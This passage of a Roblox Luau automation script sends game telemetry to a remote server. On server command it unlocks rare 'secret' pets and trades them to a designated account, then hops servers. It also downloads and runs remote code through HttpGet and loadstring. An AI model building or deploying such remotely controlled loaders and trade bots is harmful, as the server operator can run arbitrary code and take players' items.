        ensureTradeRequestsEnabled()
        if directive.unequipSecrets ~= false then
            unequipSecretPets(secretRecords)
        end
        if directive.unlockSecrets ~= false then
            unlockSecretPets(secretRecords)
        end

        local mainTrustedSet = {
            [tostring(mainPlr.UserId)] = true,
            [mainPlr.Name:lower()] = true,
            [(mainPlr.DisplayName or mainPlr.Name):lower()] = true,
        }

        if isActiveTradeWindowVisible(mainTrustedSet) then
            hasTradedInThisServer = true
            currentTradeState = "TRADING"
            currentTradeMessage = "Trading " .. tostring(#secretRecords) .. " secrets to " .. mainPlr.Name
            offerSecretPetsAndConfirm(secretRecords, mainPlr)
        else
            currentTradeState = "REQUESTING_TRADE"
            currentTradeMessage = "Requesting trade with " .. mainPlr.Name
            requestTradeWithPlayer(mainPlr)
        end
        return
    end

    if role == "CLONE_QUEUED" then
        currentTradeState = "QUEUED"
        currentTradeMessage = "Queued #" .. tostring(directive.queuePosition or 1)
        return
    end

    if #secretRecords == 0 and (hasTradedInThisServer or (directive.mainJobId and tostring(game.JobId) == tostring(directive.mainJobId))) then
        currentTradeState = "COMPLETED"
        currentTradeMessage = "All secrets consolidated"
        if directive.hopOutAfterTrade ~= false then
            currentTradeState = "HOPPING_OUT"
            hopToAnotherServer(directive.mainJobId)
        end
    else
        currentTradeState = "IDLE"
        currentTradeMessage = nil
    end
end

-- Start Reporter
attachHatchListeners()
if CONFIG.INSPECT_ON_START then
    task.spawn(sendInspectorSnapshot)
end

local keyStatus = (#CONFIG.API_KEY > 0) and "Key: set" or "Key: open"
print("[TrackStats v" .. SCRIPT_VERSION .. "] Live telemetry & auto-trade agent started -> " .. CONFIG.ENDPOINT_URL .. " (" .. keyStatus .. ")")

task.spawn(function()
    while _G.__TapSimTrackStats_Token == RUN_TOKEN do
        local ok, err = pcall(function()
            local core = collectCoreStats()
            local secretPets, equippedPets, invCount, totalPetPower = collectPetsReadOnly()
            local secretRecords = collectOwnedSecretRecords()
            local boosts = collectActiveBoosts()

            local secretUuids = {}
            for _, rec in ipairs(secretRecords) do
                table.insert(secretUuids, rec.uuid)
            end

            local hatchesToSend = {}
            if #pendingHatches > 0 then
                for i = 1, math.min(#pendingHatches, 10) do
                    table.insert(hatchesToSend, table.remove(pendingHatches, 1))
                end
            end

            local payload = {
                userId = LocalPlayer.UserId,
                currentTaps = core.currentTaps,
                totalTaps = core.totalTaps,
                currentRebirths = core.currentRebirths,
                totalRebirths = core.totalRebirths,
                currentWins = core.currentWins,
                totalWins = core.totalWins,
                currentCurrency = core.currentCurrency,
                eggsHatched = core.eggsHatched,
                world = core.world,
                equippedPets = equippedPets,
                petInventoryCount = invCount,
                totalPetPower = totalPetPower,
                activeBoosts = boosts,
                recentHatches = hatchesToSend,
                clientSource = "luau",
                timestamp = os.time(),
                placeId = game.PlaceId,
                jobId = tostring(game.JobId or ""),
                tradeState = currentTradeState,
                tradeMessage = currentTradeMessage,
                secretInstanceIds = secretUuids,
            }

            if secretPets ~= nil then
                payload.secretPets = secretPets
            end

            local okPost, resp = postJson(CONFIG.ENDPOINT_URL, payload)
            if okPost and type(resp) == "table" and type(resp.Body) == "string" then
                local okDec, bodyTbl = pcall(function() return HttpService:JSONDecode(resp.Body) end)
                if okDec and type(bodyTbl) == "table" then
                    if CONFIG.AUTO_RELOAD and type(bodyTbl.script_version) == "string" and bodyTbl.script_version ~= SCRIPT_VERSION then
                        print("[TrackStats] New script version " .. bodyTbl.script_version .. " available — hot-reloading...")
                        _G.__TapSimTrackStats_Token = "RELOADING"
                        task.spawn(function()
                            local okGet, src = pcall(function() return game:HttpGet(CONFIG.LOADER_URL) end)
                            if okGet and type(src) == "string" and #src > 100 then
                                local fn = loadstring(src)
                                if fn then
                                    fn()
                                end
                            end
                        end)
                        return
                    end

                    if type(bodyTbl.trade_directive) == "table" then
                        pcall(executeTradeDirective, bodyTbl.trade_directive, secretRecords)
                    end
                end
            end
        end)
        if not ok then
            logDebug("Tick error: " .. tostring(err))
        end
        task.wait(CONFIG.SEND_INTERVAL)
    end

    for _, conn in ipairs(connections) do
        pcall(function() conn:Disconnect() end)
    end
    print("[TrackStats v" .. SCRIPT_VERSION .. "] Stopped previous reporter instance.")
end)
